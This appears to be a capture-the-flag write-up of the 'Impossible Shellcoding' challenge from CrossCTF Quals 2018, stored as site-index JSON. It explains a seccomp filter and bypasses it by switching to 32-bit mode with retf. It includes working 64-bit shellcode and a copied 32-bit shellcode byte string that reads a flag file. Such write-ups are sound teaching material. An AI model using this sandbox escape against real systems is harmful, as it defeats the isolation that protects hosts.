jarsp (@jarsp)","title":"Impossible Shellcoding - CrossCTF Quals 2018 (pwn)"},{"location":"crossctf-quals2018/pwn/impossible_shellcoding/#challenge","text":"Opening this up in radare2, we can get the following pseudocode. prctl(prctl(PR_SET_NO_NEW_PRIVS, 1, 0, 0, 0)); prctl(PR_SET_SECCOMP, SECCOMP_MODE_FILTER, seccomp_rules, 0, 0); char* buffer = mmap(0x40404000, 0x1000, 7, 0x32); read(0, buffer, 0x100); // runs the shellcode that was read into the buffer void (*func)() = buffer; func(); So, this is a shellcoding challenge, except that it is not so straightforward. There are 2 prctl calls that are designed to make our life difficult. The first one prevents us from running the program as other users, by blocking set-user-id and set-group-id functions. The second one sets up SECCOMP rules, which is a filter to block certain syscalls, based on the syscall number (K in the table below). Using seccomp-tools , we can get the following table. line CODE JT JF K ================================= 0000: 0x20 0x00 0x00 0x00000004 A = arch 0001: 0x15 0x00 0x00 0xc000003e /* no-op */ 0002: 0x20 0x00 0x00 0x00000000 A = sys_number 0003: 0x35 0x0c 0x00 0x40000000 if (A = 0x40000000) goto 0016 0004: 0x15 0x0b 0x00 0x00000002 if (A == open) goto 0016 0005: 0x15 0x0a 0x00 0x00000101 if (A == openat) goto 0016 0006: 0x15 0x09 0x00 0x00000055 if (A == creat) goto 0016 0007: 0x15 0x08 0x00 0x0000003b if (A == execve) goto 0016 0008: 0x15 0x07 0x00 0x00000039 if (A == fork) goto 0016 0009: 0x15 0x06 0x00 0x0000003a if (A == vfork) goto 0016 0010: 0x15 0x05 0x00 0x00000142 if (A == execveat) goto 0016 0011: 0x15 0x04 0x00 0x00000038 if (A == clone) goto 0016 0012: 0x15 0x03 0x00 0x00000065 if (A == ptrace) goto 0016 0013: 0x15 0x02 0x00 0x0000009d if (A == prctl) goto 0016 0014: 0x15 0x01 0x00 0x0000009e if (A == arch_prctl) goto 0016 0015: 0x06 0x00 0x00 0x7fff0000 return ALLOW 0016: 0x06 0x00 0x00 0x00000000 return KILL","title":"Challenge"},{"location":"crossctf-quals2018/pwn/impossible_shellcoding/#seccomp","text":"We see that execve and execveat are blocked, which means no shell for us. Ok. As for ORW (open, read, write) capabilities, open and openat are blocked so we cannot do the typical procedure of open ing the file, read ing from the file into a buffer, then finally write ing the buffer into standard output. Great. fork / vfork / clone are blocked, so we can't create new processes that are free of these seccomp restrictions. There was a writeup on a similar challenge, which uses the x32 ABI . How this works is we can syscall 0x40000000 + syscall_num_you_actually_want to call the syscall and bypass seccomp, due to the x32 ABI of kernels. Sadly at line 0x003, any syscall greater than 0x40000000 is also blocked. So far, the major problem is that open() and its variants can't be used, however read / write are still available so we do not need to worry about that. There is another syscall called open_by_handle_at that I wanted to use, but for it to work the binary had to be root (I wasted 5 hours on this).","title":"SECCOMP"},{"location":"crossctf-quals2018/pwn/impossible_shellcoding/#retf","text":"However, there is still one more trick - executing 32-bit code instead. In 32-bit code, we can use 32-bit syscalls (which have different syscall numbers) to bypass the seccomp filter, as the seccomp filter only blocks the syscall based on its number. To run 32-bit code from 64-bit code, we can use the retf instruction which pops 2 values from the stack, the first being the next instruction address and the second being the new value of the CS (Code Segment) register. If the CS register becomes 0x33, it is executing 64-bit code, whereas if the CS register becomes 0x23, it is executing 32-bit code. One important thing to take note is, since 32-bit code can only read the lower 32-bits from 64-bit registers, we have to make sure we reset the registers the shellcode uses to lower values (including the instruction pointer register!).","title":"retf"},{"location":"crossctf-quals2018/pwn/impossible_shellcoding/#exploit","text":"The exploit consists of two parts, firstly, 64-bit shellcode that does the following: 1. mmap with low addresses with RWX (read-write-exec) permissions 2. Read in 32-bit shellcode that opens the file and reads it into the mmap ed memory because the orginal binary only reads in 256 bytes - not enough! 3. retf to the mmap'ed memory to run the 32-bit shellcode mmap = ''' xor rax, rax mov al, 9 mov rdi, 0x602000 mov rsi, 0x1000 mov rdx, 7 mov r10, 0x32 mov r8, 0xffffffff mov r9, 0 syscall''' read = ''' mov rax, 0 xor rdi, rdi mov rsi, 0x602190 mov rdx, 100 syscall''' retf = ''' xor rsp, rsp mov esp, 0x602160 mov DWORD PTR [esp+4], 0x23 mov DWORD PTR [esp], 0x602190 retf ''' sc = mmap + read + retf f = asm(sc) p.sendline(f) The second step is just to send in 32-bit shellcode to read the flag. # Send 32-bit shellcode that open-reads the flag and writes to stdout # Copied from http://shell-storm.org/shellcode/files/shellcode-73.php p.sendline( \\x31\\xc0\\x31\\xdb\\x31\\xc9\\x31\\xd2 + \\xeb\\x32\\x5b\\xb0\\x05\\x31\\xc9\\xcd + \\x80\\x89\\xc6\\xeb\\x06\\xb0\\x01\\x31 + \\xdb\\xcd\\x80\\x89\\xf3\\xb0\\x03\\x83 + \\xec\\x01\\x8d\\x0c\\x24\\xb2\\x01\\xcd + \\x80\\x31\\xdb\\x39\\xc3\\x74\\xe6\\xb0 + \\x04\\xb3\\x01\\xb2\\x01\\xcd\\x80\\x83 + \\xc4\\x01\\xeb\\xdf\\xe8\\xc9\\xff\\xff + \\xff + /flag.txt\\x00 ) Finally, print(p.recv()) to get the flag.","title":"Exploit"}]}